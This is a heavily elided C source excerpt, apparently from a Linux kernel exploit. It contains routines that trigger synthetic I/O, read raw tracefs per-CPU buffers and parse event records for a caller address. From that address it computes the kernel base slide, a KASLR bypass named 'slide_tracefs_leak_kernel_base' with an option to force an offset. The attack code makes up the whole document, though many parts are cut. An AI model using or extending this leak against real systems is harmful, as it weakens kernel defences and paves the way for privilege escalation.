/* Modified locally: generate the tracefs sample required by the AFZG1 path. */
#include "common.h"
...
static int slide_generate_blocked_io(void) {
  char path[128];
  ...
  int ok = 1;
  for (int iteration = 0; iteration < 16 && ok; iteration++) {
    size_t done = 0;
    while (done < 0x40000) {
  ...
  for (size_t pos = 16; pos + 4 <= end;) {
    ...
    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
      ...
      if (caller >= link_caller) {
        ...
        if (candidate <= 0x1ff000ULL && (candidate & 0xfffULL) == 0) {
...
static int slide_tracefs_parse_linear(
    const unsigned char *data, size_t size, uintptr_t *candidate_out) {
  for (size_t pos = 0; pos + 24 <= size; pos += 4) {
    uint16_t event_id = 0;
    uint64_t caller = 0;
    memcpy(&event_id, data + pos, sizeof(event_id));
    if (event_id != SLIDE_TRACEFS_EVENT_ID) continue;
    memcpy(&caller, data + pos + 16, sizeof(caller));
    uint64_t link_caller = KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
    if (caller < link_caller) continue;
    uint64_t candidate = caller - link_caller;
    if (candidate <= 0x1ff000ULL && (candidate & 0xfffULL) == 0) {
      pr_success("slide tracefs linear caller=%016llx candidate=%08llx\n",
                 (unsigned long long)caller,
                 (unsigned long long)candidate);
      *candidate_out = (uintptr_t)candidate;
      return 1;
...
static int slide_tracefs_leak_kernel_base(void) {
  ...
  if (!slide_generate_blocked_io()) {
    pr_error("slide tracefs synthetic I/O failed errno=%d\n", errno);
  ...
  for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
    ...
    while ((got = read(fd, page, sizeof(page))) > 0) {
      if (slide_tracefs_parse_page(page, (size_t)got, &candidate) ||
          slide_tracefs_parse_linear(page, (size_t)got, &candidate)) {
        found = 1;
        break;
      }
    }
...
*/
  ...
  if (forced_offset_arg && *forced_offset_arg) {
    ...
    if (errno || end == forced_offset_arg || *end || value > 0x1ff000ULL ||
        (value & 0xfffULL) != 0) {
